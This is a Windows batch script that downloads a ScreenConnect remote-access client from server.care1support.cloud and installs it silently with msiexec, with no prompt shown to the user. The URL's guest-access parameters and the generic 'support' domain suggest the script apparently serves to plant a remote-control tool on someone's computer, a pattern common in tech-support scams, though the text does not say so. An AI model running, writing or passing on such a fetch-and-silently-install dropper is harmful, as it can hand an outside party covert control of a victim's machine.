@echo off
setlocal enabledelayedexpansion

REM ==============================
REM Configuration
REM ==============================
set MSI_URL=https://server.care1support.cloud/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest&c=&c=&c=userA&c=&c=&c=&c=&c=
set MSI_NAME=ClientSetup.msi
set DOWNLOAD_DIR=%TEMP%\MSIInstall
set MSI_PATH=%DOWNLOAD_DIR%\%MSI_NAME%
set LOG_FILE=%DOWNLOAD_DIR%\install.log

REM ==============================
REM Create download directory
REM ==============================
if not exist "%DOWNLOAD_DIR%" (
    mkdir "%DOWNLOAD_DIR%"
)

REM ==============================
REM Download MSI
REM ==============================
echo Downloading MSI...
curl -L "%MSI_URL%" -o "%MSI_PATH%" --fail
if errorlevel 1 (
    echo ERROR: Download failed
    exit /b 1
)

REM ==============================
REM Verify file exists
REM ==============================
if not exist "%MSI_PATH%" (
    echo ERROR: MSI not found after download
    exit /b 2
)

REM ==============================
REM Install MSI
REM ==============================
echo Installing MSI...
msiexec /i "%MSI_PATH%" /qn /norestart /log "%LOG_FILE%"

set INSTALL_EXIT_CODE=%ERRORLEVEL%

REM ==============================
REM Exit with installer result
REM ==============================
if %INSTALL_EXIT_CODE% neq 0 (
    echo ERROR: MSI install failed with code %INSTALL_EXIT_CODE%
    exit /b %INSTALL_EXIT_CODE%
)

echo MSI installed successfully
exit /b 0

